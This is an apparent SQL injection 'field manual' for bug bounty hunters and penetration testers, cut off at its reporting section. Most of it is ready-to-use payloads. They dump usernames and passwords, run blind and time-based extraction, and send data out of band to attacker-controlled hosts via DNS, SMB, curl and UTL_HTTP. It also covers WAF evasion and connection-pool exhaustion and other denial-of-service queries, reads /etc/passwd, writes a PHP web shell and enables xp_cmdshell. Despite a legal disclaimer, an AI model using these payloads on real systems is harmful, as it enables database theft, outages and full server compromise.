# SQL Injection — Research-Level Field Manual
### For Bug Bounty Hunters, Penetration Testers & Database Stress Testers

> **Legal notice:** This document is for authorized testing only. Always have written permission before testing any system. Bug bounty programs define their scope — test only within it. Unauthorized testing is illegal regardless of intent.

---

## Table of Contents

1. [Mental Model — How the Database Thinks](#1-mental-model)
2. [Recon Before You Touch Anything](#2-recon-first)
3. [Fingerprinting the Database Engine](#3-fingerprinting)
4. [Error-Based Extraction — Mining the Stack Trace](#4-error-based)
5. [Building Complex Queries — From Basic to Stress Test](#5-complex-queries)
6. [Blind Injection — High-Speed Binary Search](#6-blind-binary-search)
7. [Time-Based Attacks — Sub-Second Precision](#7-time-based)
8. [Out-of-Band Channels — DNS, HTTP, SMB](#8-oob)
9. [Second-Order & Stored Injection](#9-second-order)
10. [JSON, XML, GraphQL — Modern Attack Surfaces](#10-modern-surfaces)
11. [ORM Injection — Bypassing "Safe" Frameworks](#11-orm-injection)
12. [WAF Bypass — Real 2024+ Techniques](#12-waf-bypass)
13. [Database Stress Testing via SQL — Load & Logic](#13-stress-testing)
14. [Privilege Escalation After Injection](#14-privesc)
15. [Reporting — What Actually Gets Triaged](#15-reporting)
16. [Tool Stack & Automation](#16-tools)

---

## 1. Mental Model

The database parser has one job: turn a string of bytes into a parse tree. It does not know where those bytes came from. The injection point is any location where attacker-controlled data reaches the parser as **syntax**, not as **a value**.

```
Safe:   WHERE id = $1          ← parameter, opaque to parser
Unsafe: WHERE id = '"+input+"' ← input becomes syntax
```

### The Injection Context Map

Before writing a single payload, identify **where** you are inside the query:

| Context           | Delimiter to escape | Comment syntax        | Example location         |
|-------------------|---------------------|-----------------------|--------------------------|
| String (single q) | `'`                 | `--`, `#`, `/**/`     | `WHERE name='INPUT'`     |
| String (double q) | `"`                 | `--`                  | `WHERE name="INPUT"`     |
| Integer           | none needed         | `--`                  | `WHERE id=INPUT`         |
| LIKE clause       | `'` + `%` / `_`    | `--`                  | `WHERE name LIKE '%INP%'`|
| IN clause         | `)` + `'`           | `--`                  | `WHERE id IN (INP)`      |
| ORDER BY          | no quotes, no `--`  | injection via CASE    | `ORDER BY INPUT`         |
| Table/column name | `` ` ``, `"`, `[]`  | N/A — must be valid   | Dynamic column select    |
| Subquery context  | `)` first           | then normal           | `(SELECT ... INPUT)`     |

Getting the context wrong wastes every attempt. Confirm context by injecting the closing delimiter and observing the error or behavioral change.

---

## 2. Recon First

Never start with payloads. Spend 80% of time on recon.

### 2.1 Map Every Input Surface

Not just text boxes. Every one of these can carry SQL:

```
URL parameters:       /items?id=5&sort=name&order=asc
Hidden form fields:   <input type="hidden" name="ref" value="abc123">
HTTP headers:         X-Forwarded-For, User-Agent, Referer, Cookie
JSON bodies:          {"filter": {"name": "test"}, "sort": "price"}
XML/SOAP:             <userId>INPUT</userId>
GraphQL:              query { user(id: INPUT) { ... } }
Path segments:        /user/INPUT/profile
File upload names:    filename="INPUT.jpg"
WebSocket frames:     {"action":"search","term":"INPUT"}
Search autocomplete:  /api/suggest?q=INPUT (often less hardened)
```

### 2.2 Passive Fingerprinting (No Payloads Yet)

Look at what the app already tells you before injecting anything:

```bash
# Error pages reveal DB type
curl -s "https://target.com/item?id=abc" | grep -iE "mysql|mssql|oracle|postgresql|sqlite|ORA-|ODBC"

# Response headers can leak
curl -I "https://target.com/" | grep -iE "server|x-powered-by|set-cookie"
# ASP.NET + IIS → likely MSSQL
# PHP → likely MySQL/MariaDB  
# Java/.NET → could be Oracle, MSSQL, PostgreSQL
# Ruby/Python → likely PostgreSQL

# Stack traces in JS/API errors
fetch('/api/user?id=abc')  # trigger unhandled error

# JavaScript source maps & bundle analysis
# Look for sequelize, typeorm, knex, mongoose, pg, mysql2 in bundle
# These reveal ORM → database mapping
```

### 2.3 Behavior Baselining

Record normal behavior FIRST so you can detect anomalies:

```
Normal response:  200, body length 4821, time 120ms
Test response A:  200, body length 4821, time 118ms  → identical = no change
Test response B:  200, body length 4782, time 122ms  → shorter body = something removed?
Test response C:  500, body length 312,  time 89ms   → error = injection context hit
Test response D:  200, body length 4821, time 5120ms → time delay = time-based possible
```

Use Burp Suite's "Response Clustering" or write a baseline script:

```python
import requests, statistics

def baseline(url, param, n=10):
    times, lengths = [], []
    for _ in range(n):
        r = requests.get(url, params={param: "1"})
        times.append(r.elapsed.total_seconds())
        lengths.append(len(r.content))
    return {
        "avg_time": statistics.mean(times),
        "stddev_time": statistics.stdev(times),
        "avg_len": statistics.mean(lengths),
        "stddev_len": statistics.stdev(lengths)
    }
```

---

## 3. Fingerprinting the Database Engine

Each database has unique syntax. Before extracting data, confirm the engine. Use syntax that only works on one engine:

### 3.1 Fingerprint Query Matrix

```sql
-- MySQL / MariaDB
' AND SLEEP(0)-- -           → delays (function exists)
' AND 1=BENCHMARK(1,1)-- -   → CPU spike, no sleep
' UNION SELECT @@version-- - → returns version string
' UNION SELECT user()-- -    → current DB user
' UNION SELECT database()--  → current schema name

-- PostgreSQL
' AND pg_sleep(0)=''-- -     → delays
' UNION SELECT version()-- - → "PostgreSQL 15.2 on x86_64..."
' UNION SELECT current_user--
' UNION SELECT current_database()--
'; SELECT pg_sleep(0)-- -    → stacked query test

-- Microsoft SQL Server (MSSQL)
' WAITFOR DELAY '0:0:0'-- -  → delays
' UNION SELECT @@version-- -
' UNION SELECT system_user-- 
' UNION SELECT db_name()-- - → current database
'; EXEC xp_cmdshell('ping 127.0.0.1')-- (if enabled)

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',0)=0-- 
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
' UNION SELECT user FROM dual--
' UNION SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual--
-- Oracle requires FROM clause in SELECT, always use FROM dual

-- SQLite
' UNION SELECT sqlite_version()-- -
' UNION SELECT name FROM sqlite_master WHERE type='table'-- -
' AND typeof(1)='integer'-- -
```

### 3.2 Error Message Fingerprinting

Inject a syntax error and read the response:

```sql
'           → raw quote, see what error format appears
''          → escaped quote test  
\           → backslash (MySQL sometimes reveals path)
;           → statement terminator test
```

| Error signature                                | Engine          |
|------------------------------------------------|-----------------|
| `You have an error in your SQL syntax`         | MySQL/MariaDB   |
| `Unclosed quotation mark after...`             | MSSQL           |
| `ORA-00907: missing right parenthesis`         | Oracle          |
| `ERROR: unterminated quoted string at...`      | PostgreSQL      |
| `SQLite3::Exception: near...`                  | SQLite          |
| `Incorrect syntax near`                        | MSSQL           |
| `mysql_fetch_array()`                          | MySQL (PHP)     |
| `pg_query():`                                  | PostgreSQL (PHP)|

---

## 4. Error-Based Extraction — Mining the Stack Trace

When errors are reflected in the response, this is the fastest extraction method. Each engine has specific functions that embed data inside error messages.

### 4.1 MySQL Error-Based

```sql
-- ExtractValue: injects data into XML error
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -
-- Error: XPATH syntax error: '~8.0.32~'

-- UpdateXML: same concept, different function
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -

-- Double query with floor+rand (classic, very reliable):
' UNION SELECT 1,2,(SELECT 1 FROM
  (SELECT COUNT(*),CONCAT(
    (SELECT database()),
    FLOOR(RAND(0)*2)
  )x FROM information_schema.tables GROUP BY x)a)-- -

-- Extracting table names:
' AND extractvalue(1,concat(0x7e,(
  SELECT GROUP_CONCAT(table_name)
  FROM information_schema.tables
  WHERE table_schema=database()
),0x7e))-- -

-- Extracting column names from a specific table:
' AND extractvalue(1,concat(0x7e,(
  SELECT GROUP_CONCAT(column_name)
  FROM information_schema.columns
  WHERE table_name='users'
),0x7e))-- -

-- Dump data row by row using LIMIT:
' AND extractvalue(1,concat(0x7e,(
  SELECT CONCAT(username,0x3a,password)
  FROM users LIMIT 0,1
),0x7e))-- -
-- Increment LIMIT 1,1 → 2,1 → 3,1 to paginate
```

### 4.2 PostgreSQL Error-Based

```sql
-- CAST type mismatch forces value into error:
' AND CAST((SELECT version()) AS int)-- -
-- ERROR: invalid input syntax for type integer: "PostgreSQL 15.2..."

-- Verbose cast with substring for long values:
' AND CAST((SELECT substring(version(),1,100)) AS int)-- -

-- Enum-based trick (very reliable in Postgres):
' AND 1=CAST((SELECT table_name FROM information_schema.tables
  WHERE table_schema='public' LIMIT 1 OFFSET 0) AS int)-- -
```

### 4.3 MSSQL Error-Based

```sql
-- Convert type mismatch:
' AND 1=CONVERT(int,(SELECT TOP 1 table_name 
  FROM information_schema.tables))-- -
-- Error: Conversion failed when converting the nvarchar value 'users'...

-- Arithmetic overflow trick:
' AND 1/CONVERT(int,(SELECT TOP 1 name FROM sys.databases))-- -

-- FOR XML PATH subversion (dump multiple rows):
' AND 1=CONVERT(int,(
  SELECT TOP 1 name FROM sys.tables
  FOR XML PATH('')
))-- -
```

### 4.4 Oracle Error-Based

```sql
-- CTXSYS.DRITHSX.SN causes errors with embedded data:
' UNION SELECT CTXSYS.DRITHSX.SN(user,1337) FROM dual-- -

-- UTL_INADDR DNS-based extraction (if network enabled):
' UNION SELECT UTL_INADDR.GET_HOST_NAME(
  (SELECT user FROM dual)
) FROM dual-- -
```

---

## 5. Building Complex Queries — From Basic to Stress Test

### 5.1 Query Complexity Ladder

**Stage 1 — Confirm injection (1 column, 1 row):**
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -    ← add NULLs until no error (= column count)
' UNION SELECT NULL,NULL,NULL-- -
```

**Stage 2 — Find string columns:**
```sql
' UNION SELECT 'a',NULL,NULL-- -   ← move 'a' until it appears in output
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

**Stage 3 — Single-table full dump:**
```sql
' UNION SELECT 
  username,
  password,
  email
FROM users LIMIT 100-- -
```

**Stage 4 — Cross-table JOIN extraction:**
```sql
' UNION SELECT 
  u.username,
  u.password,
  GROUP_CONCAT(r.role_name SEPARATOR ',')
FROM users u
JOIN user_roles ur ON u.id = ur.user_id
JOIN roles r ON ur.role_id = r.id
GROUP BY u.id LIMIT 50-- -
```

**Stage 5 — Schema discovery in one shot:**
```sql
-- MySQL: get all tables + column counts in one query
' UNION SELECT 
  table_schema,
  table_name,
  GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR '|')
FROM information_schema.columns
WHERE table_schema NOT IN ('mysql','performance_schema','information_schema','sys')
GROUP BY table_schema, table_name
ORDER BY table_schema, table_name-- -
```

**Stage 6 — Nested subquery with conditional extraction:**
```sql
-- Dump admin users only, pivot emails + roles:
' UNION SELECT
  u.id,
  u.email,
  (SELECT GROUP_CONCAT(p.permission_name)
   FROM permissions p
   JOIN role_permissions rp ON p.id = rp.permission_id
   JOIN roles r ON rp.role_id = r.id
   JOIN user_roles ur2 ON r.id = ur2.role_id
   WHERE ur2.user_id = u.id) AS perms
FROM users u
WHERE EXISTS (
  SELECT 1 FROM user_roles ur
  JOIN roles r ON ur.role_id = r.id
  WHERE ur.user_id = u.id AND r.role_name = 'admin'
)-- -
```

**Stage 7 — Stress-test query (designed to hit DB hard):**
```sql
-- This creates a Cartesian product — a deliberate cross join
-- Use ONLY in authorized stress testing
' UNION SELECT
  a.table_name,
  b.column_name,
  c.table_rows
FROM information_schema.tables a
CROSS JOIN information_schema.columns b
CROSS JOIN information_schema.tables c
WHERE a.table_schema = database()
  AND b.table_schema = database()
  AND c.table_schema = database()
LIMIT 10000-- -

-- Recursive CTE stress test (PostgreSQL/MSSQL):
'; WITH RECURSIVE counter AS (
  SELECT 1 AS n
  UNION ALL
  SELECT n+1 FROM counter WHERE n < 100000
)
SELECT SUM(n) FROM counter-- -
```

### 5.2 ORDER BY Injection (Blind Context — No Quotes)

The ORDER BY clause doesn't accept subqueries directly but responds to CASE expressions:

```sql
-- Detect injection: if first char of version > 'M', sort DESC
?sort=CASE WHEN SUBSTRING(version(),1,1)>'M' THEN name ELSE id END

-- Binary search on arbitrary string:
?sort=CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users 
  WHERE username='admin')>'m' THEN name ELSE price END

-- Confirm column count safe to inject:
?sort=1                → works
?sort=2                → works  
?sort=100              → error = only N columns
?sort=(SELECT 1)       → PostgreSQL/MSSQL may allow subquery in ORDER BY
```

### 5.3 INSERT / UPDATE Injection

These are often completely missed. Found in registration forms, profile updates, logging.

```sql
-- INSERT context — injecting into VALUES:
-- Original: INSERT INTO logs (event, user_id) VALUES ('INPUT', 5)
-- Payload closes values and adds another row:
test'),('injected', (SELECT password FROM users LIMIT 1)

-- UPDATE context:
-- Original: UPDATE users SET bio='INPUT' WHERE id=5
-- Payload exfiltrates via CASE into bio field:
' || (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 
     THEN 'YES' ELSE 'NO' END)-- -
```

---

## 6. Blind Injection — High-Speed Binary Search

### 6.1 The Slow Way vs The Fast Way

**Slow (character by character, linear):**
```
Is char 1 = 'a'? → No
Is char 1 = 'b'? → No
...
Is char 1 = 's'? → Yes  ← 19 requests for one character
```

**Fast (binary search — log2(95) ≈ 7 requests per character):**
```sql
-- Is ASCII value of char > 64? (splits alphabet in half)
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64-- -

-- Bisect: >96? → narrows to lowercase
-- >106? → narrows to k-z range
-- Each question eliminates half the space
```

### 6.2 Optimized Bitwise Extraction

Extract 8 bits at once with BITWISE operations — faster than ASCII comparison:

```sql
-- MySQL: extract bit 7 (most significant) of first char
' AND (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) >> 7) & 1-- -

-- Loop bits 7 down to 0 to reconstruct the full byte
-- 8 requests reconstruct one character exactly
-- vs 7 requests for binary search — comparable but parallelizable
```

### 6.3 Bulk Extraction via Conditional Length

```sql
-- Instead of extracting char by char, check if known hash matches:
' AND (SELECT MD5(password) FROM users WHERE username='admin')='5f4dcc3b5aa765d61d8327deb882cf99'-- -

-- Or extract full string length first:
' AND LENGTH((SELECT password FROM users WHERE username='admin'))=32-- -
-- Confirms MD5 hash (32 chars) → can use wordlist attack after extracting hash
```

### 6.4 Error-Amplified Blind (NEW technique)

When boolean behavior is subtle, amplify it with an error on FALSE:

```sql
-- MySQL: causes divide-by-zero ONLY if condition is false
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')>0, 1, 1/0)-- -
-- TRUE  → 1 (no error, normal page)
-- FALSE → ERROR (1 divided by 0 → 500 error, clearly different)

-- PostgreSQL version:
' AND CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0
    THEN 1 ELSE CAST(1/0 AS int) END-- -
```

---

## 7. Time-Based Attacks — Sub-Second Precision

### 7.1 Adaptive Timing Model

Network jitter means a 1-second delay is unreliable. Use an adaptive threshold:

```python
import requests, time, statistics

def measure(url, params, n=5):
    """Measure baseline and compare with payload."""
    # Baseline
    baseline = []
    for _ in range(n):
        t = time.time()
        requests.get(url, params=params)
        baseline.append(time.time() - t)
    
    avg = statistics.mean(baseline)
    std = statistics.stdev(baseline)
    threshold = avg + (std * 3)  # 3-sigma threshold
    return avg, threshold

# Use 3-5s delay (not 1s) to clear jitter
def is_true(url, condition_sql, delay=5):
    payload = f"1; IF({condition_sql}) WAITFOR DELAY '0:0:{delay}'"
    t = time.time()
    requests.get(url, params={"id": payload}, timeout=30)
    elapsed = time.time() - t
    return elapsed >= delay * 0.9   # 90% of expected delay = TRUE
```

### 7.2 Per-Engine Time Injection Syntax

```sql
-- MySQL: sleep whole seconds or fractions
1 AND SLEEP(3)-- -
1 AND SLEEP(0.5)-- -    ← 500ms, useful for fast enumeration
1 AND BENCHMARK(50000000, SHA1(1))-- - ← CPU-based, no sleep function needed

-- PostgreSQL: fractional seconds supported
1; SELECT pg_sleep(3)-- -
1; SELECT pg_sleep(0.1)-- -

-- MSSQL: HH:MM:SS format
1; WAITFOR DELAY '0:0:3'-- -
1; WAITFOR DELAY '0:0:0.500'-- -  ← 500ms

-- Oracle: DBMS_PIPE is most reliable
1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',3)-- -
-- Alternative (slower, less reliable):
1 AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<=1 
  AND (SELECT 'x' FROM DUAL WHERE DBMS_LOCK.SLEEP(3)='y')IS NULL)-- -

-- SQLite: no sleep, but heavy query causes delay
1 AND 1=(SELECT COUNT(*) FROM sqlite_master 
  JOIN sqlite_master m2 JOIN sqlite_master m3)-- -
```

### 7.3 Condition-Gated Timing

```sql
-- MySQL: time delay ONLY if condition is true
1 AND IF(
  (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s',
  SLEEP(3),
  0
)-- -

-- MSSQL:
1; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s'
   WAITFOR DELAY '0:0:3'-- -

-- PostgreSQL: use DO block with conditional sleep
1; SELECT CASE WHEN 
  (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='s'
  THEN pg_sleep(3) 
  ELSE pg_sleep(0) END-- -
```

---

## 8. Out-of-Band Channels — DNS, HTTP, SMB

OOB is the most powerful technique when the application returns nothing useful. The database makes an outbound connection; data travels in the request itself (usually as a DNS subdomain).

### 8.1 MySQL OOB via LOAD_FILE + UNC Path

```sql
-- Requires: FILE privilege + outbound SMB/DNS allowed
-- Trigger DNS lookup with data as subdomain:
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT HEX(password) FROM users LIMIT 1),
  '.attacker-burp-collaborator.net\\share'))-- -

-- You see DNS request: 3530346463633362...attacker-burp-collaborator.net
-- Decode the hex: SELECT UNHEX('3530346463633362...')
```

### 8.2 MSSQL OOB via xp_dirtree

```sql
-- xp_dirtree triggers SMB/DNS:
'; EXEC xp_dirtree '\\'+
  (SELECT TOP 1 master.dbo.fn_varbintohexstr(
    CONVERT(varbinary, password)
  ) FROM users)+
  '.attacker.burpcollaborator.net\share'-- -

-- xp_fileexist (same effect, sometimes less restricted):
'; EXEC xp_fileexist '\\'+
  (SELECT TOP 1 password FROM users)+
  '.attacker.burpcollaborator.net\file'-- -
```

### 8.3 PostgreSQL OOB via COPY TO PROGRAM

```sql
-- Requires superuser or pg_write_server_files role:
'; COPY (SELECT password FROM users LIMIT 1) 
   TO PROGRAM 'curl -d @- http://attacker.burpcollaborator.net/'-- -

-- Or DNS via dblink:
'; SELECT dblink_send_query(
  'host='||(SELECT password FROM users LIMIT 1)||'.attacker.net user=x dbname=x',
  'SELECT 1'
)-- -
```

### 8.4 Oracle OOB via UTL_HTTP / UTL_DNS

```sql
-- HTTP exfiltration:
' UNION SELECT UTL_HTTP.REQUEST(
  'http://attacker.burpcollaborator.net/?d='||
  (SELECT password FROM users WHERE username='admin' AND ROWNUM=1)
) FROM dual-- -

-- DNS lookup (less privilege needed than HTTP):
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS(
  (SELECT password FROM users WHERE username='admin' AND ROWNUM=1)||
  '.attacker.burpcollaborator.net'
) FROM dual-- -
```

**Tool:** Use [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [interactsh](https://github.com/projectdiscovery/interactsh) to receive the OOB callback.

---

## 9. Second-Order & Stored Injection

### 9.1 Where to Find It

Second-order injection lives in the gap between two different code paths:

```
Path A (safe):  Registration form → sanitized → stored in DB
Path B (unsafe): Profile update reads stored value → uses it raw in another query
```

**High-value locations to test:**
- Username used in password reset queries
- Email address used in notification queries
- Display name used in admin panel queries
- User-controlled preferences used in report generation
- API keys / tokens stored then used in queries

### 9.2 Testing Strategy

```
Step 1: Register/input a payload and observe nothing unusual
Step 2: Trigger every function that USES that data
Step 3: Monitor for delayed errors, behavior changes, timing

Payload examples to register with:
  Username: admin'--
  Username: ' UNION SELECT 1,2,3--
  Username: \
  Email: x'@x.com
  Name: '; DROP TABLE sessions--
```

### 9.3 Detecting Storage vs. Execution

```python
# Mark your payloads with unique identifiers to trace them:
payloads = [
    "test_A'--",          # comment injection
    "test_B' OR '1'='1",  # tautology
    "test_C\\",           # backslash (MySQL escape escape)
]

# Register each, then exhaust every feature:
features_to_test = [
    "/profile",
    "/password-reset",
    "/account/delete",
    "/export/data",
    "/admin/user-list",   # if accessible
    "/notifications/settings",
]
```

---

## 10. Modern Attack Surfaces

### 10.1 JSON Column Injection (PostgreSQL/MySQL 5.7+)

Modern apps store JSON in database columns and query into them:

```sql
-- Original query:
SELECT * FROM events WHERE data->>'user' = 'INPUT'

-- PostgreSQL JSON operator injection:
' UNION SELECT data->>'password', data->>'email', NULL FROM users-- -

-- MySQL JSON function injection:
' AND JSON_EXTRACT(data,'$.is_admin')=true-- -

-- Nested JSON path traversal:
?filter={"name": {"$regex": ".*"}}  → check for NoSQL confusion in hybrid apps
```

### 10.2 GraphQL Injection

GraphQL resolvers often build SQL dynamically from field names:

```graphql
# Introspection first — always try this:
{ __schema { types { name fields { name } } } }

# Field name injection:
{ users(orderBy: "name; SELECT sleep(3)-- -") { id name } }

# Filter argument injection:
{ users(filter: {name: {eq: "' UNION SELECT password FROM users-- -"}}) { name } }

# Batch query abuse (sends many queries in one request):
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  ...1000 more
]
```

### 10.3 OData / REST Filter Injection

```
/api/products?$filter=name eq 'INPUT'
/api/users?$filter=id eq INPUT and password eq 'x'

-- Injection attempts:
$filter=name eq '' or 1 eq 1 or name eq ''
$filter=id eq 1; SELECT sleep(3)--
```

### 10.4 XML / SOAP Injection

```xml
<!-- Original: -->
<search><term>INPUT</term></search>

<!-- SQL injection via XML element:-->
<search><term>' UNION SELECT username,password FROM users-- -</term></search>

<!-- XXE + SQL combined (if XML parser is external-entity-enabled): -->
<search>
  <!DOCTYPE x [<!ENTITY ext SYSTEM "http://attacker.net/?data=
    ' UNION SELECT password FROM users-- -">]>
  <term>&ext;</term>
</search>
```

---

## 11. ORM Injection — Bypassing "Safe" Frameworks

### 11.1 Raw Query Escapes in ORMs

Developers often fall back to raw SQL inside ORMs, negating all protection:

```python
# Django — VULNERABLE raw() call:
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")

# Safe alternative:
User.objects.raw("SELECT * FROM users WHERE name = %s", [name])

# SQLAlchemy — VULNERABLE text() with f-string:
db.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# Safe:
db.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})
```

### 11.2 ORM ORDER BY Injection

ORMs often pass sort parameters directly, creating an unquoted injection:

```python
# Django: safe filter(), vulnerable order_by() with user input
queryset = User.objects.filter(active=True).order_by(user_input)
# Payload: -name); SELECT sleep(3)--

# Test for ORM order-by injection:
?sort=name                         → normal
?sort=-name                        → descending (Django convention)
?sort=name,email                   → if multiple fields accepted
?sort=(SELECT SLEEP(3))            → time-based test
?sort=CASE WHEN 1=1 THEN name END  → boolean test
```

### 11.3 Sequelize (Node.js) Injection

```javascript
// VULNERABLE: user input in where clause object
User.findAll({ where: { name: req.query.name } })
// If name = { [Op.like]: '%' } → dumps all users

// VULNERABLE: raw query
sequelize.query(`SELECT * FROM users WHERE id = ${req.params.id}`)

// Test for Sequelize operator injection:
// Send JSON body: {"username": {"$like": "%"}}
// Or URL encoded: ?username[$like]=%25
```

---

## 12. WAF Bypass — Real 2024+ Techniques

### 12.1 Normalization Attacks

```sql
-- Double URL encoding (bypasses WAFs that decode once):
%27  → '  (single decode — WAF sees %27, blocks)
%2527 → %27 → '  (double decode — WAF sees %2527, allows; app decodes twice)

-- Unicode normalization:
ʼ (U+02BC MODIFIER LETTER APOSTROPHE) → some DBs treat as '
＇(U+FF07 FULLWIDTH APOSTROPHE) → MySQL may normalize

-- UTF-8 overlong encoding:
%c0%a7  → '  (overlong encoding of 0x27)
-- Older/misconfigured parsers accept this; WAF doesn't recognize it
```

### 12.2 Comment & Whitespace Fragmentation

```sql
-- MySQL accepts these as whitespace:
SELECT/**/username/**/FROM/**/users
SEL/**/ECT username FROM users    ← splits keyword across comment (some WAFs fail)
SELECT%09username%09FROM%09users  ← tab characters
SELECT%0ausername%0afrom%0ausers  ← newlines
SELECT%0d%0ausername FROM users   ← CRLF
SELECT`username`FROM`users`       ← backtick quoting (MySQL)

-- MSSQL accepts:
SELECT%20%20%20username FROM users   ← extra spaces
SELECT[username]FROM[users]           ← bracket quoting
```

### 12.3 Case & Encoding Tricks

```sql
-- Most SQL engines are case-insensitive for keywords:
uNiOn SeLeCt UsErNaMe FrOm UsErS

-- Hex-encoded strings eliminate quotes entirely:
SELECT * FROM users WHERE name = 0x61646d696e
-- 0x61646d696e = 'admin'

-- CHAR() function for string construction without quotes:
SELECT * FROM users WHERE name = CHAR(97,100,109,105,110)
-- CHAR(97,100,109,105,110) = 'admin'

-- MySQL scientific notation for numeric context:
id=1e0   ← 1 in scientific notation, bypasses numeric filters
id=0x1   ← hex for 1
```

### 12.4 HTTP-Level Bypass

```
-- Parameter pollution: send same param twice
GET /item?id=1&id=' UNION SELECT...
-- Some WAFs check first; apps use last (or vice versa)

-- Chunked transfer encoding bypass:
Transfer-Encoding: chunked
-- WAF may not buffer/reassemble; app does → payload split across chunks

-- Unexpected Content-Type:
Content-Type: application/x-www-form-urlencoded;charset=ibm037
-- IBM EBCDIC encoding — some WAFs don't decode it; DB does

-- HTTP Parameter Pollution via arrays:
id[]=1&id[]=' UNION SELECT password FROM users--
-- PHP: $_GET['id'] = [1, "' UNION..."] — app might join array
```

### 12.5 Time-Delay WAF Detection

```python
# WAF often adds latency — detect it:
# Direct IP vs. WAF-fronted host comparison:
import requests, time

def detect_waf_overhead(direct_ip, waf_host, path):
    headers_direct = {"Host": direct_ip}
    headers_waf    = {"Host": waf_host}
    
    t1 = time.time(); requests.get(f"http://{direct_ip}{path}", headers=headers_direct)
    direct_time = time.time() - t1
    
    t2 = time.time(); requests.get(f"https://{waf_host}{path}", headers=headers_waf)
    waf_time = time.time() - t2
    
    overhead = waf_time - direct_time
    print(f"WAF overhead: {overhead*1000:.0f}ms")
    # >50ms overhead suggests deep packet inspection
```

---

## 13. Database Stress Testing via SQL

### 13.1 Query Complexity Attacks (Authorized Load Testing)

These are designed to exhaust CPU, memory, or I/O:

```sql
-- Cartesian JOIN explosion (CPU):
-- N × M × P rows generated — grows exponentially
SELECT COUNT(*) FROM
  information_schema.columns a,
  information_schema.columns b,
  information_schema.columns c
-- With 1000 columns → 1,000,000,000 row combinations

-- BENCHMARK CPU burnout (MySQL):
SELECT BENCHMARK(100000000, SHA2('test', 256))
-- Runs SHA-256 100 million times → pure CPU load

-- Recursive CTE stack exhaustion (PostgreSQL):
WITH RECURSIVE r(n) AS (
  SELECT 1
  UNION ALL
  SELECT n+1 FROM r WHERE n < 1000000
)
SELECT SUM(n) FROM r;

-- MSSQL recursive CTE:
WITH r AS (
  SELECT 1 AS n
  UNION ALL
  SELECT n+1 FROM r WHERE n < 32767
)
SELECT SUM(n) FROM r OPTION (MAXRECURSION 32767);

-- Disk I/O exhaustion:
SELECT * FROM large_table ORDER BY RAND()
-- RAND() forces filesort — can't use index, must read full table
```

### 13.2 Lock Contention Testing

```sql
-- MySQL: explicit lock that blocks other queries
BEGIN;
SELECT * FROM users FOR UPDATE;
-- Don't COMMIT — hold lock, observe other connections timeout

-- MSSQL: hint-based lock escalation
SELECT * FROM users WITH (TABLOCKX, HOLDLOCK)
-- Acquires exclusive table lock

-- PostgreSQL: advisory lock test
SELECT pg_advisory_lock(12345);
-- Check if app handles lock wait timeout gracefully
```

### 13.3 Connection Pool Exhaustion

```sql
-- Inject a long-running query through the injection point
-- to exhaust DB connection pool:
' AND SLEEP(30)-- -

-- With many parallel requests (authorized DoS test):
# Use ab (Apache Bench) or wrk:
ab -n 1000 -c 50 "http://target.com/item?id=1%20AND%20SLEEP(30)--+-"

-- Observe: new requests fail with "too many connections"
-- This reveals connection pool is small and no query timeout is set
```

### 13.4 Error Flood Detection

```sql
-- Send malformed queries to trigger error logging:
-- Observe if app exposes debug info, or if errors cause performance hit
' AND 1=CONVERT(int,'aaaaaaaaaa...very_long_string...')-- -

-- Truncation attack:
-- Some DBs throw on string truncation:
INSERT INTO users (username) VALUES (REPEAT('a', 100000))
```

---

## 14. Privilege Escalation After Injection

Once you have SQL execution, escalate:

### 14.1 Read Files

```sql
-- MySQL (requires FILE privilege):
UNION SELECT LOAD_FILE('/etc/passwd')-- -
UNION SELECT LOAD_FILE('/var/www/html/config.php')-- -

-- PostgreSQL (pg_read_file — superuser only):
SELECT pg_read_file('/etc/postgresql/15/main/pg_hba.conf')

-- MSSQL (BULK INSERT / OPENROWSET):
SELECT BulkColumn FROM OPENROWSET(
  BULK '/etc/passwd', SINGLE_BLOB
) AS t
```

### 14.2 Write Files → Web Shell

```sql
-- MySQL: write PHP shell to webroot
UNION SELECT '<?php system($_GET[cmd]); ?>'
INTO OUTFILE '/var/www/html/shell.php'-- -

-- PostgreSQL (requires superuser):
COPY (SELECT '<?php system($_GET[cmd]); ?>') 
TO '/var/www/html/shell.php'
```

### 14.3 Execute OS Commands

```sql
-- MSSQL: xp_cmdshell (disabled by default, but re-enable possible)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- PostgreSQL: COPY TO PROGRAM
COPY (SELECT 1) TO PROGRAM 'id > /tmp/out.txt';
SELECT pg_read_file('/tmp/out.txt');

-- MySQL: UDF (User Defined Function) — advanced
-- Requires ability to write to plugin directory
```

---

## 15. Reporting — What Actually Gets Triaged

### 15.1 Bug Report Structure That Gets Paid

```markdown
## Vulnerability: SQL Injection in [endpoint]
**Severity:** Critical  
**CVSS Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Summary
[One-sentence description: what, where, impact]

